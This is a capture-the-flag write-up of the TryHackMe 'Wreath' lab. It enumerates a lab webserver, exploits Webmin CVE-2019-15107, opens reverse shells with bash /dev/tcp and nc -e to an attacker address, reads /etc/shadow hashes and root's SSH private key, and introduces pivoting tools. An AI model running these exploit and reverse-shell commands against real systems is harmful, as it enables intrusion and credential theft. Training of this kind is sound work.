# Wreath

Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)

https://tryhackme.com/room/wreath

## 1. Background

> *There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*

- 3 machines on the network
- At least one public facing webserver
- Self hosted git server on the network
- git server is internal. There may be sensitive information to find
- PC on the network with AV installed - likely Windows
- Windows PC cannot be directly access from the webserver 

## 2. Webserver enumeration

![Network map](./wreath-network.png)

### Initial scan

Start with nmap

We find there are 7 ports open

```
nmap -p-15000 10.200.81.200 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 01:57 EDT
Nmap scan report for 10.200.81.200
Host is up (0.26s latency).
Not shown: 14993 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
2513/tcp  closed citrixadmin
9090/tcp  closed zeus-admin
9889/tcp  open   gt-proxy
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 90.73 seconds
```

### Server OS

Find out what OS is running on the webserver - `centos`

```
nmap -p 80 -sV 10.200.81.200 -oN port80.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 02:00 EDT
Nmap scan report for 10.200.81.200
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

### Check out the web page

Opening `10.200.81.200` on a web browser redirects to `https://thomaswreath.thm/`

![Failed to resolve](./failed-resolve.png)

Fix this by editing `/etc/hosts` for Linux/Mac or `C:\Windows\System32\drivers\etc\hosts` on Windows.

`/etc/hosts` file
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.200.81.200   thomaswreath.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

With DNS resolving properly, we can now access the webserver and see if we can find any interesting information

We can see interesting info such as 
- Home address
- Home and mobile numbers `+447821548812 `
- Email address


### Check out port 10000 service

nmap scan reveals server version `MiniServ 1.890 (Webmin httpd)`
```
nmap -p 10000 -sV 10.200.81.200 -oN port10000.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:48 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.69 seconds
```

Vuln scan
```
nmap -p 10000 --script vuln 10.200.81.200 -oN port10000vuln.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 04:51 EDT
Nmap scan report for thomaswreath.thm (10.200.81.200)
Host is up (0.26s latency).

PORT      STATE SERVICE
10000/tcp open  snet-sensor-mgmt
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
|_sslv2-drown: 

Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

Quick Google search reveals this server version is vulnerable to `CVE-2019–15107`

## 3. Webserver Exploitation

Exploit can be downloaded and run from `https://github.com/MuirlandOracle/CVE-2019-15107`

pip is required to install dependencies `cd CVE-2019-15107 && pip3 install -r requirements.txt`

```
./CVE-2019-15107.py 10.200.81.200

        __        __   _               _         ____   ____ _____     
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|    
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|      
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___     
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|     
                                                                       
                                                @MuirlandOracle        
                                                                       
                                                                       
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.81.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                     
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id                                                                   
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

This is just a pseudo shell. Create a reverse shell by:

1. New terminal start a nc listener

```
nc -lvnp 1337
```

2. On the pseudo shell run a reverse bash command
   
```
/bin/bash -i >& /dev/tcp/10.50.82.56/1337 0>&1 
```

If `nc` is available you can run this

```
nc -e /bin/sh 10.50.82.56 1337 
```

3. Back on the listener terminal, we have reverse shell

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45242          
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell                                     
[root@prod-serv ]# id                                                  
id                                                                     
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

### Stabilise the shell

1. Spawn PTY with python

```
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# 
```

2. Background the shell with `CTRL Z`. Then examine current terminal and STTY info

```
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ echo $TERM
xterm-256color

kali@kali:~$ stty -a
speed 38400 baud; rows 54; columns 185; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```
> This reveals term type: `xterm-256color` and the size of current TTY: `rows 54; columns 185`

while the shell is in the background, run `stty raw -echo` then `fg` and `export TERM=xterm`

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.50.82.56] from (UNKNOWN) [10.200.81.200] 45248
bash: cannot set terminal process group (1781): Inappropriate ioctl for device
bash: no job control in this shell
[root@prod-serv ]# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@prod-serv ]# ^Z
[1]+  Stopped                 nc -lvnp 1337
kali@kali:~$ stty raw -echo
kali@kali:~$ nc -lvnp 1337
                          export TERM=xterm
[root@prod-serv ]# 
```

> Note `nc -lvnp 1337` was not typed. It was `fg` but not echoed back

The shell is now stabilised

Summary:
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. `CTRL Z`
3. `stty raw -echo`
4. `fg`
5. `export TERM=xterm`

### Dump password hash

```
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::                                                                                                                                                                    
nginx:!!:18573::::::                                                                                                                                                                     
mysql:!!:18573:::::: 
```

### Find interesting access keys

SSH keys are commonly stored in the home directory under `~/.ssh`

```
ls -la ~/.ssh
total 16
drwx------. 2 root root   80 Jan  6 03:29 .
dr-xr-x---. 3 root root  228 Apr  4 10:20 ..
-rw-r--r--. 1 root root  571 Nov  7 14:05 authorized_keys
-rw-------. 1 root root 2602 Nov  7 14:02 id_rsa
-rw-r--r--. 1 root root  571 Nov  7 14:02 id_rsa.pub
-rw-r--r--. 1 root root  345 Apr  3 07:54 known_hosts
```

Since we are root, we have read access to the private key `id_rsa`. Save the key locally

```
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE
LgAe9qk9dvQA7pJb9V6vfLc+Vm6XLC1JY9Ljou89Cd4AcTJ9OruYZXTDnX0hW1vO5Do1bS
...
YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY
EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==
-----END OPENSSH PRIVATE KEY-----
```

Copy it to local machine and change file permission to suit SSH standards

```
kali@kali:~/thm/wreath/.ssh$ chmod 600 id_rsa 
kali@kali:~/thm/wreath/.ssh$ ls -la
total 12
drwxr-xr-x 2 kali kali 4096 Apr  4 05:30 .
drwxr-xr-x 4 kali kali 4096 Apr  4 05:30 ..
-rw------- 1 kali kali 2602 Apr  4 05:30 id_rsa
```

## 4. Pivoting

### Definition

Pivoting is using access obtained over one machine to exploit another machine deeper in the network.

The technique involves gaining initial access to a remote network, and use it to access other machines

![pivoting](pivoting.png)

Above there are four machines on the target network
- 1 public facing server
- 3 machines not exposed to the internet

By accessing the public server, it is then possible to pivot to attack the other 3 targets.

### Methods

Methods varies depending on OS

Two main methods:

1. Tunnelling/Proxying

Creating proxy connection through compromised machine. 
This could be tunnelled inside another protocol (eg. SSH tunnelling) which is useful in evading basic intrusion detection system or firewall

Proxying is preferred when there is need to redirect lots of different kinds of traffic to target network eg. nmap scan or access multiple ports on multiple different machines

2. Port forwarding

Creating a connection between local port and single port on a target via compromised host

Port forwarding tends to be faster and more reliable but only allow access to a single port (or small range) on a target device

Example pivoting tools

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)

## 5. Pivoting Enumeration
